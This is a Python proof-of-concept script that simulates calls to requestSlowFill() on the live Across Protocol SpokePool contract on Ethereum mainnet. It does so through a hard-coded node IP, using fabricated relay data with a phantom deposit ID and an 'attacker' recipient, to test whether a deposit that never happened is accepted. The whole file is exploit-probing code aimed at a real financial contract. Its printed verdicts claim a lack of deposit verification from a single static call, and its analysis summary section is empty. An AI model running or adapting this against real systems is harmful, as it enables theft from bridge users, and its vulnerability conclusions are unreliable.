#!/usr/bin/env python3
"""
Simulate requestSlowFill() on the Across Protocol SpokePool (Ethereum)
to test whether it accepts a fabricated/phantom deposit.

Target: 0x5c7BCd6E7De5423a257D81B442095A1a6ced35C5 (ERC1967 Proxy)
Implementation: 0x5e5b726c81f43b953a62ad87e2835c85c4d9dd3b
"""

import json
import time
from web3 import Web3

# --- Configuration ---
RPC_URL = "http://15.235.183.30:8545"  # Geth node
SPOKEPOOL = "0x5c7BCd6E7De5423a257D81B442095A1a6ced35C5"
CALLER = "0x000000000000000000000000000000000000dEaD"  # arbitrary caller

# ABI for requestSlowFill
ABI = [
    {
        "inputs": [
            {
                "components": [
                    {"internalType": "address", "name": "depositor", "type": "address"},
                    {"internalType": "address", "name": "recipient", "type": "address"},
                    {"internalType": "address", "name": "exclusiveRelayer", "type": "address"},
                    {"internalType": "address", "name": "inputToken", "type": "address"},
                    {"internalType": "address", "name": "outputToken", "type": "address"},
                    {"internalType": "uint256", "name": "inputAmount", "type": "uint256"},
                    {"internalType": "uint256", "name": "outputAmount", "type": "uint256"},
                    {"internalType": "uint256", "name": "originChainId", "type": "uint256"},
                    {"internalType": "uint32", "name": "depositId", "type": "uint32"},
                    {"internalType": "uint32", "name": "fillDeadline", "type": "uint32"},
                    {"internalType": "uint32", "name": "exclusivityDeadline", "type": "uint32"},
                    {"internalType": "bytes", "name": "message", "type": "bytes"},
                ],
                "internalType": "struct V3SpokePoolInterface.V3RelayData",
                "name": "relayData",
                "type": "tuple",
            }
        ],
        "name": "requestSlowFill",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    }
]

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={"timeout": 30}))

    if not w3.is_connected():
        print("ERROR: Cannot connect to RPC")
        return

    # Get current block info
    latest_block = w3.eth.get_block("latest")
    block_number = latest_block["number"]
    block_timestamp = latest_block["timestamp"]

    print(f"Connected to Ethereum mainnet")
    print(f"Latest block: {block_number}")
    print(f"Block timestamp: {block_timestamp} ({time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(block_timestamp))})")
    print(f"Current time:    {int(time.time())} ({time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())})")
    print()

    contract = w3.eth.contract(address=Web3.to_checksum_address(SPOKEPOOL), abi=ABI)

    # Construct fabricated relay data
    fill_deadline = block_timestamp + 3600  # 1 hour in the future

    relay_data = (
        Web3.to_checksum_address("0x0000000000000000000000000000000000000001"),  # depositor (fabricated)
        Web3.to_checksum_address("0x0000000000000000000000000000000000000002"),  # recipient (attacker)
        Web3.to_checksum_address("0x0000000000000000000000000000000000000000"),  # exclusiveRelayer = zero (no exclusivity)
        Web3.to_checksum_address("0x82aF49447D8a07e3bd95BD0d56f35241523fBab1"),  # inputToken: WETH on Arbitrum
        Web3.to_checksum_address("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"),  # outputToken: WETH on Ethereum
        1_000_000_000_000_000_000,  # inputAmount: 1 ETH
        990_000_000_000_000_000,    # outputAmount: 0.99 ETH
        42161,                       # originChainId: Arbitrum
        999_999_999,                 # depositId: fabricated (never deposited)
        fill_deadline,               # fillDeadline: 1h in future
        0,                           # exclusivityDeadline: 0 (no exclusivity)
        b"",                         # message: empty
    )

    print("=== Fabricated V3RelayData ===")
    labels = [
        "depositor", "recipient", "exclusiveRelayer", "inputToken", "outputToken",
        "inputAmount", "outputAmount", "originChainId", "depositId",
        "fillDeadline", "exclusivityDeadline", "message"
    ]
    for label, val in zip(labels, relay_data):
        if isinstance(val, bytes):
            print(f"  {label}: 0x{val.hex() if val else ''} (empty)")
        elif isinstance(val, int) and val > 10**9:
            print(f"  {label}: {val} ({val / 10**18:.4f} ETH)" if val > 10**15 else f"  {label}: {val}")
        else:
            print(f"  {label}: {val}")
    print()

    # Encode the function call
    call_data = contract.encode_abi("requestSlowFill", args=[relay_data])
    print(f"Encoded calldata ({len(call_data)} bytes): {call_data[:10]}...{call_data[-8:]}")
    print()

    # --- Simulation 1: eth_call (static simulation) ---
    print("=" * 60)
    print("SIMULATION 1: eth_call (static, no state changes)")
    print("=" * 60)

    try:
        result = w3.eth.call({
            "from": CALLER,
            "to": Web3.to_checksum_address(SPOKEPOOL),
            "data": call_data,
            "gas": 500_000,
        })
        print(f"SUCCESS! eth_call returned: 0x{result.hex()}")
        print(">>> requestSlowFill() ACCEPTED the fabricated deposit <<<")
        print(">>> No on-chain deposit verification occurred <<<")
    except Exception as e:
        error_str = str(e)
        print(f"REVERTED: {error_str}")

        # Try to decode custom error or revert reason
        if "revert" in error_str.lower():
            print("\nRevert reason analysis:")
            # Check for common Across revert reasons
            if "InvalidSlowFillRequest" in error_str:
                print("  -> InvalidSlowFillRequest: The contract rejected the slow fill request")
            elif "ExpiredFillDeadline" in error_str:
                print("  -> ExpiredFillDeadline: fillDeadline has passed")
            elif "ExclusivityNotExpired" in error_str:
                print("  -> Exclusivity period not yet expired")
            elif "RelayFilled" in error_str:
                print("  -> This relay hash was already filled")
            elif "MsgValueDoesNotMatchInputAmount" in error_str:
                print("  -> msg.value mismatch")
            else:
                print(f"  -> Raw error: {error_str[:500]}")

    print()

    # --- Simulation 2: Compute the relay hash and check fill status ---
    print("=" * 60)
    print("SIMULATION 2: Check fill status for this relay hash")
    print("=" * 60)

    # The relay hash is keccak256(abi.encode(relayData, destinationChainId))
    # destinationChainId = 1 (Ethereum mainnet, where SpokePool lives)

    # Encode relayData struct + destinationChainId
    relay_data_encoded = w3.codec.encode(
        [
            "(address,address,address,address,address,uint256,uint256,uint256,uint32,uint32,uint32,bytes)",
            "uint256",
        ],
        [relay_data, 1],  # destinationChainId = 1
    )
    relay_hash = Web3.keccak(relay_data_encoded)
    print(f"Relay hash: 0x{relay_hash.hex()}")

    # Check fillStatuses mapping: mapping(bytes32 => uint256)
    # The slot for fillStatuses is slot ... we need the storage slot
    # fillStatuses(relayHash) is at keccak256(relayHash . slot)
    # For Across V3 SpokePool, fillStatuses is a public mapping

    fill_status_abi = [
        {
            "inputs": [{"internalType": "bytes32", "name": "", "type": "bytes32"}],
            "name": "fillStatuses",
            "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
            "stateMutability": "view",
            "type": "function",
        }
    ]
    status_contract = w3.eth.contract(address=Web3.to_checksum_address(SPOKEPOOL), abi=fill_status_abi)

    try:
        fill_status = status_contract.functions.fillStatuses(relay_hash).call()
        status_names = {0: "Unfilled", 1: "RequestedSlowFill", 2: "Filled"}
        print(f"Fill status for relay hash: {fill_status} ({status_names.get(fill_status, 'Unknown')})")
        if fill_status == 0:
            print(">>> Fill status is Unfilled - the contract will accept a requestSlowFill for this hash <<<")
    except Exception as e:
        print(f"Could not check fill status: {e}")

    print()

    # --- Simulation 3: eth_call with trace-level detail using raw JSON-RPC ---
    print("=" * 60)
    print("SIMULATION 3: eth_call with detailed error decoding")
    print("=" * 60)

    import requests

    payload = {
        "jsonrpc": "2.0",
        "method": "eth_call",
        "params": [
            {
                "from": CALLER,
                "to": SPOKEPOOL,
                "data": call_data,
                "gas": hex(500_000),
            },
            "latest",
        ],
        "id": 1,
    }

    resp = requests.post(RPC_URL, json=payload, timeout=30)
    result = resp.json()

    if "error" in result:
        error = result["error"]
        print(f"RPC error code: {error.get('code')}")
        print(f"RPC error message: {error.get('message')}")
        if "data" in error:
            error_data = error["data"]
            print(f"Error data: {error_data}")

            # Try to decode known Across error selectors
            if isinstance(error_data, str) and error_data.startswith("0x"):
                selector = error_data[:10]
                known_errors = {
                    "0x08c379a0": "Error(string)",  # standard revert
                    "0x4e487b71": "Panic(uint256)",  # panic
                }
                if selector in known_errors:
                    print(f"Error type: {known_errors[selector]}")
                    # Decode string revert
                    if selector == "0x08c379a0":
                        try:
                            decoded = w3.codec.decode(["string"], bytes.fromhex(error_data[10:]))
                            print(f"Revert message: {decoded[0]}")
                        except:
                            pass
                else:
                    print(f"Custom error selector: {selector}")
                    # Common Across custom errors
                    custom_errors = {
                        "0xe0b33de7": "InvalidSlowFillRequest()",
                        "0x7dc2e2d1": "ExpiredFillDeadline()",
                        "0xa3d4d977": "NoSlowFillsInExclusivityWindow()",
                    }
                    if selector in custom_errors:
                        print(f"Decoded: {custom_errors[selector]}")
    else:
        result_data = result.get("result", "0x")
        print(f"SUCCESS! Result: {result_data}")
        print(">>> requestSlowFill() ACCEPTED the fabricated deposit <<<")
        print(">>> The function completed without revert <<<")
        print(">>> This means:")
        print(">>>   1. fillDeadline check passed (future timestamp)")
        print(">>>   2. exclusivity check passed (exclusiveRelayer = 0x0)")
        print(">>>   3. fill status was Unfilled (fabricated hash never seen before)")
        print(">>>   4. NO verification of deposit existence on origin chain")
        print(">>>   5. A RequestedSlowFill event would be emitted")

    print()
    print("=" * 60)
    print("ANALYSIS SUMMARY")
    print("=" * 60)


if __name__ == "__main__":
    main()
